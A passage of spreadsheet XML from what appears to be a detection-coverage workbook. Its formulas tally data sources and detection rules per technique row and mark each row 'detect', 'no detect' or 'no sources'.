        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O56" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P56" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S5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6" t="s">
        <v>368</v>
      </c>
      <c r="U56" t="s">
        <v>590</v>
      </c>
      <c r="V56" t="s">
        <v>591</v>
      </c>
      <c r="W56" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="57" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A57" t="s">
        <v>592</v>
      </c>
      <c r="B57" t="s">
        <v>592</v>
      </c>
      <c r="C57" t="s">
        <v>202</v>
      </c>
      <c r="D57" t="s">
        <v>8</v>
      </c>
      <c r="E57" t="s">
        <v>593</v>
      </c>
      <c r="F57" s="9">
        <f t="shared" si="0"/>
        <v>9</v>
      </c>
      <c r="G57" s="9" cm="1">
        <f t="array" ref="G57">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H57" s="9" cm="1">
        <f t="array" ref="H57">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I57" s="9" t="str" cm="1">
        <f t="array" ref="I57">IF(SUM(IF($C57=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C57=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J57" s="9" t="str" cm="1">
        <f t="array" ref="J5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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M57" s="9" cm="1">
        <f t="array" ref="M57">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N57" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O57" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P57" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S5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7" t="s">
        <v>425</v>
      </c>
      <c r="U57" t="s">
        <v>594</v>
      </c>
      <c r="V57" t="s">
        <v>595</v>
      </c>
      <c r="W57" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="58" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A58" t="s">
        <v>596</v>
      </c>
      <c r="B58" t="s">
        <v>596</v>
      </c>
      <c r="C58" t="s">
        <v>184</v>
      </c>
      <c r="D58" t="s">
        <v>6</v>
      </c>
      <c r="E58" t="s">
        <v>597</v>
      </c>
      <c r="F58" s="9">
        <f t="shared" si="0"/>
        <v>12</v>
      </c>
      <c r="G58" s="9" cm="1">
        <f t="array" ref="G58">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H58" s="9" cm="1">
        <f t="array" ref="H58">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>10</v>
      </c>
      <c r="I58" s="9" cm="1">
        <f t="array" ref="I58">IF(SUM(IF($C58=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C58=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J58" s="9" cm="1">
        <f t="array" ref="J5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58" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>10</v>
      </c>
      <c r="M58" s="9" cm="1">
        <f t="array" ref="M58">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>10</v>
      </c>
      <c r="N58" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O58" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0.1</v>
      </c>
      <c r="P58" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S5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modifier should be increased for the technique</v>
      </c>
      <c r="T58" t="s">
        <v>598</v>
      </c>
      <c r="U58" t="s">
        <v>599</v>
      </c>
      <c r="V58" t="s">
        <v>600</v>
      </c>
      <c r="W58" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="59" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A59" t="s">
        <v>596</v>
      </c>
      <c r="B59" t="s">
        <v>601</v>
      </c>
      <c r="C59" t="s">
        <v>602</v>
      </c>
      <c r="D59" t="s">
        <v>6</v>
      </c>
      <c r="E59" t="s">
        <v>531</v>
      </c>
      <c r="F59" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G59" s="9" cm="1">
        <f t="array" ref="G59">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H59" s="9" t="str" cm="1">
        <f t="array" ref="H59">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I59" s="9" t="str" cm="1">
        <f t="array" ref="I59">IF(SUM(IF($C59=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C59=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J59" s="9" t="str" cm="1">
        <f t="array" ref="J5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9" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M59" s="9" cm="1">
        <f t="array" ref="M59">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N59" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O59" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P59" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S5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9" t="s">
        <v>603</v>
      </c>
      <c r="U59" t="s">
        <v>604</v>
      </c>
      <c r="V59" t="s">
        <v>605</v>
      </c>
      <c r="W59" t="b">
        <v>1</v>
      </c>
      <c r="X59" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="60" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A60" t="s">
        <v>596</v>
      </c>
      <c r="B60" t="s">
        <v>606</v>
      </c>
      <c r="C60" t="s">
        <v>607</v>
      </c>
      <c r="D60" t="s">
        <v>6</v>
      </c>
      <c r="E60" t="s">
        <v>531</v>
      </c>
      <c r="F60" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G60" s="9" cm="1">
        <f t="array" ref="G60">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H60" s="9" t="str" cm="1">
        <f t="array" ref="H60">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I60" s="9" t="str" cm="1">
        <f t="array" ref="I60">IF(SUM(IF($C60=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C60=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J60" s="9" t="str" cm="1">
        <f t="array" ref="J6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0" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M60" s="9" cm="1">
        <f t="array" ref="M60">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N60" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O60" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P60" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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0" t="s">
        <v>368</v>
      </c>
      <c r="U60" t="s">
        <v>608</v>
      </c>
      <c r="V60" t="s">
        <v>609</v>
      </c>
      <c r="W60" t="b">
        <v>1</v>
      </c>
      <c r="X60" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="61" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A61" t="s">
        <v>596</v>
      </c>
      <c r="B61" t="s">
        <v>610</v>
      </c>
      <c r="C61" t="s">
        <v>611</v>
      </c>
      <c r="D61" t="s">
        <v>6</v>
      </c>
      <c r="E61" t="s">
        <v>612</v>
      </c>
      <c r="F61" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G61" s="9" cm="1">
        <f t="array" ref="G61">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H61" s="9" t="str" cm="1">
        <f t="array" ref="H61">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I61" s="9" t="str" cm="1">
        <f t="array" ref="I61">IF(SUM(IF($C61=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C61=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J61" s="9" t="str" cm="1">
        <f t="array" ref="J6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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M61" s="9" cm="1">
        <f t="array" ref="M61">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N61" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O61" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P61" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S6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1" t="s">
        <v>368</v>
      </c>
      <c r="U61" t="s">
        <v>613</v>
      </c>
      <c r="V61" t="s">
        <v>614</v>
      </c>
      <c r="W61" t="b">
        <v>1</v>
      </c>
      <c r="X61" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="62" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A62" t="s">
        <v>596</v>
      </c>
      <c r="B62" t="s">
        <v>615</v>
      </c>
      <c r="C62" t="s">
        <v>616</v>
      </c>
      <c r="D62" t="s">
        <v>6</v>
      </c>
      <c r="E62" t="s">
        <v>617</v>
      </c>
      <c r="F62" s="9">
        <f t="shared" si="0"/>
        <v>5</v>
      </c>
      <c r="G62" s="9" cm="1">
        <f t="array" ref="G62">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H62" s="9" t="str" cm="1">
        <f t="array" ref="H62">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I62" s="9" t="str" cm="1">
        <f t="array" ref="I62">IF(SUM(IF($C62=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C62=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J62" s="9" t="str" cm="1">
        <f t="array" ref="J6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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M62" s="9" cm="1">
        <f t="array" ref="M62">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N62" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O62" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P62" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S6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2" t="s">
        <v>368</v>
      </c>
      <c r="U62" t="s">
        <v>618</v>
      </c>
      <c r="V62" t="s">
        <v>619</v>
      </c>
      <c r="W62" t="b">
        <v>1</v>
      </c>
      <c r="X62" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="63" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A63" t="s">
        <v>596</v>
      </c>
      <c r="B63" t="s">
        <v>620</v>
      </c>
      <c r="C63" t="s">
        <v>621</v>
      </c>
      <c r="D63" t="s">
        <v>6</v>
      </c>
      <c r="E63" t="s">
        <v>622</v>
      </c>
      <c r="F63" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G63" s="9" cm="1">
        <f t="array" ref="G63">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H63" s="9" t="str" cm="1">
        <f t="array" ref="H63">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I63" s="9" t="str" cm="1">
        <f t="array" ref="I63">IF(SUM(IF($C63=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C63=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J63" s="9" t="str" cm="1">
        <f t="array" ref="J6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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M63" s="9" cm="1">
        <f t="array" ref="M63">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N63" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O63" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P63" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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3" t="s">
        <v>598</v>
      </c>
      <c r="U63" t="s">
        <v>623</v>
      </c>
      <c r="V63" t="s">
        <v>624</v>
      </c>
      <c r="W63" t="b">
        <v>1</v>
      </c>
      <c r="X63" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="64" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A64" t="s">
        <v>596</v>
      </c>
      <c r="B64" t="s">
        <v>625</v>
      </c>
      <c r="C64" t="s">
        <v>626</v>
      </c>
      <c r="D64" t="s">
        <v>6</v>
      </c>
      <c r="E64" t="s">
        <v>531</v>
      </c>
      <c r="F64" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G64" s="9" cm="1">
        <f t="array" ref="G64">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H64" s="9" t="str" cm="1">
        <f t="array" ref="H64">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I64" s="9" t="str" cm="1">
        <f t="array" ref="I64">IF(SUM(IF($C64=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C64=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J64" s="9" t="str" cm="1">
        <f t="array" ref="J6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4" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M64" s="9" cm="1">
        <f t="array" ref="M64">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N64" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O64" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P64" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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4" t="s">
        <v>503</v>
      </c>
      <c r="U64" t="s">
        <v>627</v>
      </c>
      <c r="V64" t="s">
        <v>628</v>
      </c>
      <c r="W64" t="b">
        <v>1</v>
      </c>
      <c r="X64" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="65" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A65" t="s">
        <v>596</v>
      </c>
      <c r="B65" t="s">
        <v>629</v>
      </c>
      <c r="C65" t="s">
        <v>299</v>
      </c>
      <c r="D65" t="s">
        <v>6</v>
      </c>
      <c r="E65" t="s">
        <v>566</v>
      </c>
      <c r="F65" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G65" s="9" cm="1">
        <f t="array" ref="G65">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H65" s="9" t="str" cm="1">
        <f t="array" ref="H65">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I65" s="9" t="str" cm="1">
        <f t="array" ref="I65">IF(SUM(IF($C65=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C65=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J65" s="9" t="str" cm="1">
        <f t="array" ref="J6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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M65" s="9" cm="1">
        <f t="array" ref="M65">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N65" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O65" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P65" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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5" t="s">
        <v>386</v>
      </c>
      <c r="U65" t="s">
        <v>630</v>
      </c>
      <c r="V65" t="s">
        <v>631</v>
      </c>
      <c r="W65" t="b">
        <v>1</v>
      </c>
      <c r="X65" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="66" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A66" t="s">
        <v>596</v>
      </c>
      <c r="B66" t="s">
        <v>632</v>
